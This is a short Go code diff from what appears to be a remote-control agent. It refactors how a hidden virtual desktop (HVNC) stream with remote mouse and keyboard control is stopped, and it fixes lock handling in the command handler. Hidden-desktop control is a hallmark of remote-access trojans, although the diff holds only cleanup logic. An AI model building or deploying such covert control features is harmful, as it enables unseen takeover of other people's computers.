@@ -172,6 +172,18 @@ func waitStreamStop(done <-chan struct{}, name string) {
 	}
 }
 
+func stopVirtualStreamLocked(env *runtime.Env) {
+	env.VirtualMouseControl = false
+	env.VirtualKeyboardControl = false
+	env.VirtualCursorCapture = false
+	if env.VirtualCancel != nil {
+		env.VirtualCancel()
+	}
+	waitStreamStop(env.VirtualDone, "hidden")
+	env.VirtualCancel = nil
+	env.VirtualDone = nil
+}
+
 func ensureHVNCInputWorker() {
 	hvncInputOnce.Do(func() {
 		hvncInputQueue = make(chan hvncInputEvent, 1024)
@@ -696,6 +708,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		env.DesktopCancel = nil
 		env.DesktopDone = nil
 		env.DesktopMu.Unlock()
+		env.VirtualMu.Lock()
+		if env.VirtualCancel != nil {
+			log.Printf("hidden: stop requested via desktop_stop")
+			stopVirtualStreamLocked(env)
+		}
+		env.VirtualMu.Unlock()
 		if privacy.IsEnabled() {
 			privacy.Stop()
 			log.Printf("privacy: auto-disabled on desktop stop")
@@ -1065,22 +1083,15 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "hvnc_stop":
+		env.VirtualMu.Lock()
 		if env.VirtualCancel != nil {
-			env.VirtualMu.Lock()
 			log.Printf("hidden: stop requested")
-			env.VirtualMouseControl = false
-			env.VirtualKeyboardControl = false
-			env.VirtualCursorCapture = false
-			if env.VirtualCancel != nil {
-				env.VirtualCancel()
-			}
-			waitStreamStop(env.VirtualDone, "hidden")
-			env.VirtualCancel = nil
-			env.VirtualDone = nil
+			stopVirtualStreamLocked(env)
 			env.VirtualMu.Unlock()
 			sendCommandResultSafe(env, cmdID, true, "")
 			return nil
 		}
+		env.VirtualMu.Unlock()
 		env.HVNCMu.Lock()
 		log.Printf("hvnc: stop requested")
 		env.HVNCMouseControl = false
